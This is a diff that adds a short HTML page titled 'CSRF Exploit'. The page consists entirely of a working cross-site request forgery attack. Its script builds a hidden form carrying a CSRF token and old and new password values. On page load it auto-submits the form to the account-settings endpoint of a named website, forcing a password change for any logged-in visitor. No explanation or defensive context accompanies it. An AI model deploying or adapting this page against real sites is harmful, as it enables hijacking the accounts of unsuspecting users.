@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Exploit</title>
+</head>
+<body>
+    <script>
+        // Create a form dynamically
+        var form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'https://www.ameliorate.com/accountSettings.account'; // Target URL
+
+        // CSRF Token
+        var csrfToken = '23924801361351632568'; // Provided CSRF token value
+
+        // Create hidden input fields
+        var csrfField = document.createElement('input');
+        csrfField.type = 'hidden';
+        csrfField.name = 'csrf_token';
+        csrfField.value = csrfToken;
+        form.appendChild(csrfField);
+
+        // Password change details
+        var oldPassword = document.createElement('input');
+        oldPassword.type = 'hidden';
+        oldPassword.name = 'old_password';
+        oldPassword.value = '11223344'; // Old password
+        form.appendChild(oldPassword);
+
+        var newPassword = document.createElement('input');
+        newPassword.type = 'hidden';
+        newPassword.name = 'new_password';
+        newPassword.value = '123455'; // New password
+        form.appendChild(newPassword);
+
+        // Submit the form automatically
+        document.body.appendChild(form);
+        form.submit();
+    </script>
+</body>
+</html>
